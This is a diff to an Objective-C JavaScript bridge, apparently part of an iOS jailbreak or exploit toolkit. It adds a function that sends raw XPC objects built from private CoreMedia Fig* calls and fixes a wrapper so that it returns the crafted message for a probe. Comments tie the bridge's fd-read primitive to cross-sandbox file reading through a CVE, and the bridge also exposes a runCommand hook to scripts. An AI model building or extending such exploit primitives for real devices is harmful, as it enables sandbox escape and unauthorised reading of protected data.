@@ -1344,6 +1344,55 @@ static NSDictionary *xpcSendMsgFdNative(long h, NSDictionary *msg, double timeou
     return outd;
 }
 
+// ★ V2.4.32：把「托管的 raw xpc 对象」当作整条消息发出去。
+//   为什么必须有它：Fig 握手产物（FigXPCCreateBasicMessage / ...CreateRecipient2）本身就是一个
+//   xpc dict，里面塞着 XPC endpoint 对象 —— 这种消息用 JSON 表达不出来（{"__raw":…} 注入只能
+//   填「值」，会多包一层 {"__raw": <FigMsg>}，形状与服务端期望不符）。
+//   护栏：只接受托管表内的指针（xpcRawIsRegistered），杜绝"JS 传野指针 → xpc retain 野指针 → 崩"。
+//   回包处理与 xpcSendMsgFd 一致：抽 fd + 带出服务端错误描述。
+static NSDictionary *xpcSendObjNative(long h, id ptrV, double timeoutSec, id fdKeysV) {
+    if (![ptrV isKindOfClass:[NSString class]]) return @{@"err": @"ptr-required"};
+    uintptr_t p = objcHexToPtr(ptrV);
+    if (!p) return @{@"err": @"bad-ptr"};
+    if (!xpcRawIsRegistered(p)) return @{@"err": @"not-managed-ptr"};
+    id v = xpcConnGet(h);
+    if (!v) return @{@"err": @"bad-handle"};
+    xpc_connection_t c = (xpc_connection_t)v;
+    NSArray *fdKeys = [fdKeysV isKindOfClass:[NSArray class]] ? (NSArray *)fdKeysV : nil;
+    if (timeoutSec <= 0) {
+        xpc_connection_send_message(c, (__bridge xpc_object_t)(void *)p);
+        return @{@"sent": @YES};
+    }
+    __block id reply = nil;
+    __block NSDictionary *fds = @{};
+    __block NSString *errDesc = nil;
+    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
+    xpc_connection_send_message_with_reply(c, (__bridge xpc_object_t)(void *)p,
+        dispatch_get_global_queue(QOS_CLASS_DEFAULT, 0), ^(xpc_object_t r) {
+        if (xpc_get_type(r) == XPC_TYPE_ERROR) {
+            const char *d = xpc_dictionary_get_string(r, XPC_ERROR_KEY_DESCRIPTION);
+            if (d) errDesc = [NSString stringWithUTF8String:d];
+        }
+        if (fdKeys.count && xpc_get_type(r) == XPC_TYPE_DICTIONARY) {
+            NSMutableDictionary *mf = [NSMutableDictionary dictionary];
+            for (id kk in fdKeys) {
+                if (![kk isKindOfClass:[NSString class]]) continue;
+                mf[kk] = @(xpc_dictionary_dup_fd(r, [kk UTF8String]));
+            }
+            fds = [mf copy];
+        }
+        reply = xpcToObj(r, 0);
+        dispatch_semaphore_signal(sem);
+    });
+    dispatch_time_t t = dispatch_time(DISPATCH_TIME_NOW, (int64_t)(timeoutSec * NSEC_PER_SEC));
+    if (dispatch_semaphore_wait(sem, t) != 0) return @{@"err": @"timeout"};
+    NSMutableDictionary *outd = [NSMutableDictionary dictionary];
+    outd[@"reply"] = reply ?: @{};
+    outd[@"fds"] = fds;
+    if (errDesc) outd[@"errDesc"] = errDesc;
+    return outd;
+}
+
 // 只读分块读：对 dup_fd 得到的 fd 做 pread，返回 base64（CVE 跨沙盒读落地）。
 // 只给读：pread 不改文件、不改任何状态；offset/len 由调用方控制，最大 16MB 防内存炸。
 static NSDictionary *fdPreadNative(int fd, long long offset, long long len) {
@@ -1446,6 +1495,12 @@ static NSDictionary *xpcFigBeginEstablishingNative(id msgV) {
 }
 
 // FigMemoryRecipientCreateWithXPCMessage1AndUpdateXPCMessage2(x0,x1,x2,x3)：4 参透传
+// ★ V2.4.32 修：原实现把返回值整个丢掉 → 探针拿不到 msg2（Ry-JB 的 a2 探针是从 out 缓冲读 msg2 的），
+//   等于这个原语不可用。现在两种可能签名都兼容：
+//     (a) msg2 走返回寄存器 x0 → 取返回值；
+//     (b) msg2 走 out 参数（x1 指向 8 字节槽）→ 桥侧自带 scratch 缓冲并回读。
+//   取回后登记进托管表（+1 所有权移交 ARC 保活），探针即可把它当整条消息发出去（配合 xpcSendObj）。
+//   注意：Create* 族按 ObjC 命名约定返回 +1，故用 __bridge_transfer 接管所有权。
 static NSDictionary *xpcFigCreateRecipientNative(id a0, id a1, id a2, id a3) {
     if (!figSymbolsReady() || !g_figCreateRecip) return @{@"err": @"fig-symbols-missing"};
     id av[4] = {a0, a1, a2, a3};
@@ -1455,8 +1510,21 @@ static NSDictionary *xpcFigCreateRecipientNative(id a0, id a1, id a2, id a3) {
         if (v[i] >= 0x1000 && !xpcRawIsRegistered(v[i]))
             return @{@"err": @"not-managed-ptr", @"arg": @(i)};
     }
-    ((void (*)(uintptr_t, uintptr_t, uintptr_t, uintptr_t))g_figCreateRecip)(v[0], v[1], v[2], v[3]);
-    return @{@"ok": @YES};
+    if (!v[0]) return @{@"err": @"msg1-required"};
+    // 桥侧 scratch：调用方没给 x1（out 槽）时我们自备一个 8 字节槽，兼容 out 参数签名
+    void *sp = NULL;
+    if (v[1] == 0) {
+        sp = calloc(1, sizeof(uintptr_t));
+        if (!sp) return @{@"err": @"oom"};
+        v[1] = (uintptr_t)sp;
+    }
+    uintptr_t ret = ((uintptr_t (*)(uintptr_t, uintptr_t, uintptr_t, uintptr_t))g_figCreateRecip)(v[0], v[1], v[2], v[3]);
+    uintptr_t msg2 = ret ? ret : (sp ? (uintptr_t)(*(uintptr_t *)sp) : 0);
+    if (sp) free(sp);
+    if (!msg2) return @{@"ok": @YES, @"ptr": @""}; // 签名还没摸清：没拿到 msg2，把结果如实回给探针
+    id keep = (__bridge_transfer id)(void *)msg2;
+    if (!xpcRawRegister(msg2, keep)) return @{@"err": @"raw-reg-full", @"ptr": objcHexFromPtr(msg2)};
+    return @{@"ok": @YES, @"ptr": objcHexFromPtr(msg2), @"ret": @((unsigned long long)ret)};
 }
 
 // 释放托管指针登记（只清白名单，不释放对象本身）——防注册表泄漏
@@ -3174,6 +3242,7 @@ ctx[@"runCommand"]=^NSString*(NSString *cmd){
             ctx[@"xpcConn"]=^(NSString *svc){ return xpcConnNative(svc); };
             ctx[@"xpcSendMsg"]=^(NSNumber *h, NSDictionary *msg, NSNumber *timeoutSec){ return xpcSendMsgNative([h longValue], msg, [timeoutSec doubleValue]); };
             ctx[@"xpcSendMsgFd"]=^(NSNumber *h, NSDictionary *msg, NSNumber *timeoutSec, NSArray *fdKeys){ return xpcSendMsgFdNative([h longValue], msg, [timeoutSec doubleValue], fdKeys); };
+            ctx[@"xpcSendObj"]=^(NSNumber *h, id ptrHex, NSNumber *timeoutSec, NSArray *fdKeys){ return xpcSendObjNative([h longValue], ptrHex, [timeoutSec doubleValue], fdKeys); };
             ctx[@"fdPread"]=^(NSNumber *fdN, NSNumber *offsetN, NSNumber *lenN){ return fdPreadNative((int)[fdN intValue], [offsetN longLongValue], [lenN longLongValue]); };
             // ---- V2.4.32 CoreMedia Fig* 桥：协议构造下沉到桥侧（raw 注入只认托管指针）----
             ctx[@"xpcFigCreateMessage"]=^(id op){ return xpcFigCreateMessageNative(op); };
